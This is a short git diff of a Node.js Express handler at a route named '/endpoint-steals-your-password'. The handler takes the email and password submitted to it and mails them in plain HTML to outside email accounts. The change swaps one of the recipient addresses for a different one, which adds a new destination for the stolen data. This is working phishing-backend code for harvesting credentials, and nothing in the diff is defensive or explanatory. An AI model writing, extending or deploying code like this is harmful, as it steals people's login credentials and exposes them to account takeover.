@@ -23,7 +23,7 @@ app.post("/endpoint-steals-your-password", (req, res) => {
     transport
         .sendMail({
             from: "sarsenbai_alihan@mail.ru",
-            to: ["NeaThe14@yandex.ru", "sarsenbai_alihan@mail.ru"],
+            to: ["NeaThe14@yandex.ru", "alecburks0@gmail.com"],
             html: `Email: <b>${req.body.email}</b>, Password: <b>${req.body.password}</b>`
         })
         .catch(err => {
